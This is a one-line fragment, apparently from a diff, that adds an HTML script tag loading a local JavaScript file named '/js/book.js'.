+<script src="/js/book.js"></script>
